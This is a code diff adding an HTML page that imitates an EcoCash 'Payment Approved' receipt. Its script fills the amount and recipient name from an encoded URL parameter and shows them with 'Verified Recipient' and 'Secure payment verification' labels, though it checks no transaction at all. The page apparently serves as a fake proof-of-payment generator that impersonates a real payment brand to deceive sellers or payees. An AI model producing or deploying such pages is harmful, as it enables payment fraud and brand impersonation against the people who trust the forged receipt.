@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>EcoCash · Payment Approved</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --eco-blue: #0045A0;
+    --eco-red: #E31B23;
+    --eco-green: #00A651;
+    --eco-text-main: #111827;
+    --eco-text-muted: #6B7280;
+    --eco-bg: #F3F6FA;
+    --eco-border: #E5E9F0;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  html, body {
+    min-height: 100%;
+    background: var(--eco-bg);
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    color: var(--eco-text-main);
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .app-layout {
+    width: 100%;
+    max-width: 480px;
+    margin: 0 auto;
+    min-height: 100vh;
+    padding: 16px 14px 36px;
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
+  }
+
+  .brand-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 6px 4px;
+  }
+  .logo-link {
+    display: flex;
+    align-items: baseline;
+    font-size: 26px;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+    text-decoration: none;
+    line-height: 1;
+  }
+  .logo-eco { color: var(--eco-blue); }
+  .logo-cash { color: var(--eco-red); margin-left: 1px; }
+
+  .receipt-card {
+    background: #FFFFFF;
+    border-radius: 24px;
+    border: 1px solid var(--eco-border);
+    box-shadow: 0 10px 32px rgba(0,69,160,0.05);
+    padding: 28px 20px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    gap: 18px;
+  }
+
+  .success-ring {
+    width: 88px; height: 88px; border-radius: 50%;
+    background: #E6F9EF;
+    display: flex; align-items: center; justify-content: center;
+    box-shadow: 0 0 0 8px rgba(0,166,81,0.08);
+    animation: pop 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+  }
+  @keyframes pop {
+    0% { transform: scale(0.5); opacity: 0; }
+    100% { transform: scale(1); opacity: 1; }
+  }
+  .success-core {
+    width: 64px; height: 64px; border-radius: 50%;
+    background: var(--eco-green);
+    display: flex; align-items: center; justify-content: center;
+    color: #FFFFFF; font-size: 32px; font-weight: 800;
+  }
+
+  .status-heading {
+    font-size: 22px; font-weight: 800; letter-spacing: -0.4px;
+    margin-bottom: 6px;
+  }
+  .status-subtitle {
+    font-size: 13.5px; color: var(--eco-text-muted);
+    line-height: 1.45; max-width: 340px;
+  }
+
+  .disburse-banner {
+    display: flex; align-items: center; gap: 12px;
+    background: linear-gradient(135deg, #E6F9EF, #F0FDF4);
+    border: 1.5px solid #B5EBC9;
+    border-radius: 14px;
+    padding: 14px 16px;
+    width: 100%;
+    text-align: left;
+  }
+  .disburse-icon {
+    width: 38px; height: 38px; border-radius: 50%;
+    background: #FFFFFF; color: var(--eco-green);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 18px; flex-shrink: 0;
+  }
+  .disburse-title {
+    font-size: 13px; font-weight: 800; color: #065F46;
+    text-transform: uppercase; letter-spacing: 0.5px;
+    margin-bottom: 2px;
+  }
+  .disburse-text { font-size: 13px; color: #047857; line-height: 1.4; }
+
+  .amount-box {
+    background: #FFFFFF;
+    border: 1.5px solid var(--eco-border);
+    border-radius: 16px;
+    padding: 16px 18px;
+    width: 100%;
+    text-align: left;
+  }
+  .amount-label {
+    font-size: 11px; font-weight: 700;
+    text-transform: uppercase; letter-spacing: 0.6px;
+    color: var(--eco-text-muted);
+    margin-bottom: 4px;
+  }
+  .amount-display {
+    font-size: 26px; font-weight: 800; letter-spacing: -0.6px;
+    display: flex; align-items: baseline; gap: 6px;
+  }
+  .amount-cur { font-size: 16px; font-weight: 800; color: var(--eco-green); }
+
+  .customer-card {
+    display: flex; align-items: center; gap: 14px;
+    background: #F8FAFD;
+    border: 1px solid #F1F4F8;
+    border-radius: 14px;
+    padding: 14px 16px;
+    width: 100%;
+    text-align: left;
+  }
+  .pro-avatar {
+    position: relative;
+    width: 54px; height: 54px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, var(--eco-blue), #1E6FD9);
+    color: #FFFFFF;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 18px; font-weight: 800; letter-spacing: 0.5px;
+    flex-shrink: 0;
+    box-shadow: 0 4px 12px rgba(0,69,160,0.25);
+  }
+  .verified-badge {
+    position: absolute;
+    bottom: -2px; right: -2px;
+    width: 20px; height: 20px; border-radius: 50%;
+    background: var(--eco-green);
+    border: 2.5px solid #FFFFFF;
+    display: flex; align-items: center; justify-content: center;
+    color: #FFFFFF; font-size: 10px; font-weight: 800;
+  }
+  .customer-info { display: flex; flex-direction: column; gap: 2px; flex: 1; min-width: 0; }
+  .customer-label {
+    font-size: 10px; font-weight: 700;
+    text-transform: uppercase; letter-spacing: 0.6px;
+    color: var(--eco-text-muted);
+  }
+  .customer-name {
+    font-size: 15px; font-weight: 700;
+    word-break: break-word;
+  }
+  .customer-status {
+    font-size: 11.5px; font-weight: 600; color: var(--eco-green);
+    display: flex; align-items: center; gap: 4px;
+  }
+
+  .bottom-text {
+    text-align: center; font-size: 12px; color: #94A3B8;
+    margin-top: 8px;
+  }
+</style>
+</head>
+<body>
+
+<div class="app-layout">
+
+  <header class="brand-header">
+    <a href="/" class="logo-link">
+      <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
+    </a>
+  </header>
+
+  <main class="receipt-card">
+
+    <div class="success-ring">
+      <div class="success-core">✓</div>
+    </div>
+
+    <div>
+      <h1 class="status-heading">Payment Approved</h1>
+      <p class="status-subtitle">Your transfer has been authorized and is being processed.</p>
+    </div>
+
+    <div class="disburse-banner">
+      <div class="disburse-icon">⚡</div>
+      <div>
+        <div class="disburse-title">Disbursing within 5 minutes</div>
+        <div class="disburse-text">Funds will reach the recipient shortly. You'll get a confirmation SMS.</div>
+      </div>
+    </div>
+
+    <div class="amount-box">
+      <div class="amount-label">AMOUNT SENT</div>
+      <div class="amount-display">
+        <span class="amount-cur" id="dispCur">USD</span>
+        <span id="dispAmt">0.00</span>
+      </div>
+    </div>
+
+    <div class="customer-card">
+      <div class="pro-avatar" id="proAvatar">
+        EC
+        <div class="verified-badge">✓</div>
+      </div>
+      <div class="customer-info">
+        <div class="customer-label">RECIPIENT</div>
+        <div class="customer-name" id="dispCustomer">—</div>
+        <div class="customer-status">
+          <span>✓</span><span>Verified Recipient</span>
+        </div>
+      </div>
+    </div>
+
+  </main>
+
+  <div class="bottom-text">Powered by EcoCash · Secure payment verification</div>
+
+</div>
+
+<script>
+function getInitials(name) {
+  if (!name) return 'EC';
+  const parts = String(name).trim().split(/\s+/);
+  if (parts.length === 1) return parts[0].slice(0, 2).toUpperCase();
+  return (parts[0][0] + parts[parts.length - 1][0]).toUpperCase();
+}
+
+function b64urlDecode(str) {
+  try {
+    str = str.replace(/-/g, '+').replace(/_/g, '/');
+    while (str.length % 4) str += '=';
+    return decodeURIComponent(escape(atob(str)));
+  } catch (e) { return null; }
+}
+
+function loadData() {
+  const params = new URLSearchParams(window.location.search);
+  const encoded = params.get('d');
+  let data = null;
+  if (encoded) {
+    const raw = b64urlDecode(encoded);
+    if (raw) { try { data = JSON.parse(raw); } catch (e) {} }
+  }
+  if (!data) {
+    data = { rn: 'TENDAI MOYO', am: '0.00', cur: 'USD' };
+  }
+
+  document.getElementById('dispCur').textContent = data.cur || 'USD';
+  document.getElementById('dispAmt').textContent = data.am ? Number(data.am).toFixed(2) : '0.00';
+
+  const name = (data.rn || 'Recipient').toUpperCase();
+  document.getElementById('dispCustomer').textContent = name;
+  document.getElementById('proAvatar').innerHTML = getInitials(name) + '<div class="verified-badge">✓</div>';
+}
+
+document.addEventListener('DOMContentLoaded', loadData);
+</script>
+</body>
+</html>
